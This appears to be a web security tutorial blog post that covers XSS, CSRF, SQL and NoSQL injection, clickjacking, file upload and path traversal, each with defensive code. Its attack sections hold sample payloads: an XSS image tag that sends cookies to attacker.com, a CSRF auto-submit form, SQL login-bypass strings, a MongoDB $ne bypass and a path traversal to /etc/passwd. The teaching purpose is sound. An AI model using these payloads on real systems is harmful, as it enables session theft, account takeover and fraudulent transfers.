---
title: 'Web Security Fundamentals: XSS, CSRF, SQL Injection Defense'
description: 'Master core web security vulnerabilities and defense strategies to build secure web applications'
date: '2026-02-23'
tags: ['Web Security', 'XSS', 'CSRF', 'SQL Injection', 'Security']
authors: ['rownix']
draft: false
---

> **TL;DR**: Deep dive into XSS, CSRF, SQL injection and other core security vulnerabilities, mastering defense strategies and best practices.

## OWASP Top 10 Overview

```
2021 OWASP Top 10:
┌────┬─────────────────────────────┬─────────────────┐
│ Rank │ Vulnerability Type          │ Risk Level      │
├────┼─────────────────────────────┼─────────────────┤
│ 1  │ Broken Access Control       │ 🔴 Critical     │
│ 2  │ Cryptographic Failures      │ 🔴 Critical     │
│ 3  │ Injection (SQL/NoSQL)       │ 🔴 Critical     │
│ 4  │ Insecure Design             │ 🟠 High         │
│ 5  │ Security Misconfiguration   │ 🟠 High         │
│ 6  │ Vulnerable Components       │ 🟠 High         │
│ 7  │ Auth Failures               │ 🟠 High         │
│ 8  │ Data Integrity Failures     │ 🟡 Medium       │
│ 9  │ Logging Failures            │ 🟡 Medium       │
│ 10 │ SSRF                        │ 🟡 Medium       │
└────┴─────────────────────────────┴─────────────────┘
```

## XSS (Cross-Site Scripting)

### Attack Principles

```javascript
// Attack Scenario 1: Reflected XSS
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>
// Page directly outputs user input:
document.write(`Search results: ${location.search.split('=')[1]}`)
// Result: Malicious script executes

// Attack Scenario 2: Stored XSS
// User submits comment:
// Comment: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
// When other users view the comment, their cookies are stolen

// Attack Scenario 3: DOM-based XSS
// Page code:
const hash = location.hash.slice(1)
eval(hash)  // #alert(1)
```

### Defense Solutions

```javascript
// ❌ Bad Example: Direct HTML insertion
function displayUserInput(input) {
  document.getElementById('output').innerHTML = input
}

// ✅ Correct Approach 1: Use textContent
function displayUserInput(input) {
  document.getElementById('output').textContent = input
}

// ✅ Correct Approach 2: Escape HTML
function escapeHtml(text) {
  const div = document.createElement('div')
  div.textContent = text
  return div.innerHTML
}

// ✅ Correct Approach 3: DOMPurify library
import DOMPurify from 'dompurify'

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title']
})
```

### Content Security Policy (CSP)

```http
# HTTP Response Header
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```javascript
// Report mode (monitor first, enforce later)
Content-Security-Policy-Report-Only: ...; report-uri /csp-report

// Report violations
app.post('/csp-report', (req, res) => {
  console.log('CSP Violation:', req.body)
  // Log to security logs
  securityLogger.warn('CSP Violation', req.body)
})
```

### Cookie Security Settings

```javascript
// Express secure cookie settings
res.cookie('sessionId', token, {
  httpOnly: true,      // Prevent JavaScript access
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000,     // 1 hour expiration
  domain: '.example.com'
})

// Modern browsers: Cookie prefixes
// __Host-: forces secure, no Domain attribute, Path=/
// __Secure-: forces secure
res.setHeader('Set-Cookie', 
  '__Host-sessionId=' + token + '; Path=/; Secure; HttpOnly; SameSite=Strict'
)
```

## CSRF (Cross-Site Request Forgery)

### Attack Principles

```html
<!-- Attacker page (evil.com) -->
<body>
  <!-- User is logged into bank.com, cookies sent automatically -->
  <form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>document.getElementById('csrf').submit()</script>
</body>
```

```javascript
// Image tag attack (GET request)
<img src="https://bank.com/delete-account?id=123" width="0" height="0">

// AJAX attack (CORS preflight fails, but simple requests may succeed)
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // Include cookies
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to=attacker&amount=10000'
})
```

### Defense Solutions

```javascript
// ✅ Solution 1: CSRF Token
// Server generates token
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex')
  req.session.csrfToken = csrfToken
  
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input type="text" name="to" placeholder="Recipient">
      <input type="number" name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `)
})

// Validate token
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF Token')
  }
  // Process transfer...
})
```

```javascript
// ✅ Solution 2: SameSite Cookie
// Modern browsers support by default
res.cookie('sessionId', token, {
  sameSite: 'strict'  // Completely block third-party cookies
  // sameSite: 'lax'   // Allow top-level navigation GET requests
})

// ✅ Solution 3: Double Cookie Pattern
// Server sets: Set-Cookie: csrfToken=abc123; SameSite=Strict
// Read cookie and add to request header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')  // Read from cookie
  },
  body: JSON.stringify(data)
})

// Server validation
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-csrf-token'] !== req.cookies.csrfToken) {
    return res.status(403).send('Invalid CSRF token')
  }
})
```

```javascript
// ✅ Solution 4: Verify Origin/Referer
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  const allowedOrigins = ['https://example.com', 'https://app.example.com']
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).send('Invalid origin')
  }
  next()
})
```

## SQL Injection

### Attack Principles

```javascript
// ❌ Bad Example: String concatenation SQL
app.get('/user', async (req, res) => {
  const id = req.query.id
  const sql = `SELECT * FROM users WHERE id = ${id}`
  // Attack: ?id=1 OR 1=1 --
  // Result: SELECT * FROM users WHERE id = 1 OR 1=1 --
  // Returns all users!
  
  const users = await db.query(sql)
  res.json(users)
})

// ❌ Bad Example: Login bypass
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
// Attack: username = admin' --
// Result: SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx'
// Bypasses password verification, logs in as admin!
```

### Defense Solutions

```javascript
// ✅ Solution 1: Parameterized Queries (Prepared Statements)
// Node.js + mysql2
const [rows] = await pool.execute(
  'SELECT * FROM users WHERE id = ? AND status = ?',
  [userId, 'active']
)

// ✅ Solution 2: ORM Frameworks
// Prisma
const user = await prisma.user.findUnique({
  where: { id: parseInt(userId) }
})

// Sequelize
const user = await User.findByPk(userId)

// ✅ Solution 3: Input Validation
import { z } from 'zod'

const userIdSchema = z.number().int().positive().max(1000000)

app.get('/user/:id', async (req, res) => {
  const result = userIdSchema.safeParse(parseInt(req.params.id))
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid user ID' })
  }
  // Continue processing...
})
```

### NoSQL Injection Protection

```javascript
// ❌ MongoDB injection risk
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
})
// Attack: {"username": {"$ne": null}, "password": {"$ne": null}}
// Bypasses login!

// ✅ Correct Approach
import { ObjectId } from 'mongodb'

// Validate ObjectId
if (!ObjectId.isValid(id)) {
  throw new Error('Invalid ID')
}
const doc = await collection.findOne({ _id: new ObjectId(id) })

// Use strict mode queries
const user = await db.collection('users').findOne({
  username: String(req.body.username),
  password: hashPassword(req.body.password)  // Must hash
})
```

## Other Common Attacks

### 1. Clickjacking

```javascript
// Attack: Embed target site in transparent iframe
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:100px; left:100px;">Click to claim reward</button>
// User clicks "reward" button, actually clicks transfer button
```

```http
# Defense: X-Frame-Options
X-Frame-Options: DENY                    # Completely block embedding
X-Frame-Options: SAMEORIGIN              # Only same-origin can embed

# Or CSP
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

### 2. File Upload Vulnerabilities

```javascript
// ❌ Dangerous: Direct user file save
app.post('/upload', upload.single('file'), (req, res) => {
  fs.writeFileSync(`./uploads/${req.file.originalname}`, req.file.buffer)
  // Attacker uploads: shell.php
  // Access: /uploads/shell.php?cmd=cat /etc/passwd
})

// ✅ Secure Approach
import path from 'path'
import crypto from 'crypto'
import { fileTypeFromBuffer } from 'file-type'

app.post('/upload', async (req, res) => {
  // 1. Validate file type (don't trust filename)
  const fileType = await fileTypeFromBuffer(req.file.buffer)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp']
  
  if (!allowedTypes.includes(fileType?.mime)) {
    return res.status(400).send('Unsupported file type')
  }
  
  // 2. Rename file (remove original filename)
  const ext = path.extname(req.file.originalname)
  const filename = crypto.randomUUID() + ext
  
  // 3. Save to non-web directory
  await fs.writeFile(`./private-uploads/${filename}`, req.file.buffer)
  
  // 4. Return file ID instead of path
  res.json({ fileId: filename })
})

// Image access through proxy, add watermark/auth check
app.get('/image/:id', authenticate, async (req, res) => {
  const filePath = `./private-uploads/${req.params.id}`
  // Verify file exists, user permissions...
  res.sendFile(filePath)
})
```

### 3. Path Traversal

```javascript
// ❌ Dangerous
const filePath = `./files/${req.query.filename}`
// Attack: ?filename=../../../etc/passwd
// Result: ./files/../../../etc/passwd → /etc/passwd

// ✅ Secure Approach
import path from 'path'

const BASE_DIR = path.resolve('./files')
const requestedPath = path.resolve(BASE_DIR, req.query.filename)

// Ensure within base directory
if (!requestedPath.startsWith(BASE_DIR)) {
  return res.status(403).send('Invalid path')
}

// Or use whitelist
const allowedFiles = ['report.pdf', 'data.csv', 'readme.txt']
if (!allowedFiles.includes(req.query.filename)) {
  return res.status(403).send('File not found')
}
```

## Security Development Best Practices

### 1. Dependency Security Checks

```bash
# Check for known vulnerabilities
npm audit
npm audit fix

# Or use Snyk
npx snyk test
npx snyk monitor

# Add pre-commit check
# .husky/pre-commit
npm audit --audit-level=moderate
```

### 2. Security Headers Middleware

```javascript
// Express + helmet
import helmet from 'helmet'

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}))

// Manually set critical headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-Frame-Options', 'DENY')
  res.setHeader('X-XSS-Protection', '1; mode=block')
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()')
  next()
})
```

### 3. Input Validation and Output Encoding

```javascript
// Use Zod for strict validation
import { z } from 'zod'

const userSchema = z.object({
  username: z.string().min(3).max(20).regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email(),
  age: z.number().int().min(0).max(150),
  role: z.enum(['user', 'admin'])
})

app.post('/register', async (req, res) => {
  const result = userSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ 
      error: 'Input validation failed',
      details: result.error.issues 
    })
  }
  
  // Use validated data
  const user = await createUser(result.data)
  res.json(user)
})
```

### 4. Error Handling

```javascript
// ❌ Dangerous: Leaking sensitive information
app.get('/user/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)
    res.json(user)
  } catch (error) {
    // Leaks database structure!
    res.status(500).send(error.message)  // "Table 'users' doesn't exist"
  }
})

// ✅ Secure Approach
app.use((err, req, res, next) => {
  // Log full error to logs
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    user: req.user?.id
  })
  
  // Return generic error to user
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id  // For log correlation
  })
})
```

## Security Testing Tools

```bash
# 1. Dependency vulnerability scan
npm audit
snyk test

# 2. Static code analysis (SAST)
eslint-plugin-security
semgrep

# 3. Dynamic testing (DAST)
# OWASP ZAP
zap-baseline.py -t https://example.com

# 4. Penetration testing tools
# Burp Suite, sqlmap, nmap

# 5. Container security scanning
trivy image myapp:latest
```

---

**What security issues have you encountered in development? Share your experience!** 👇
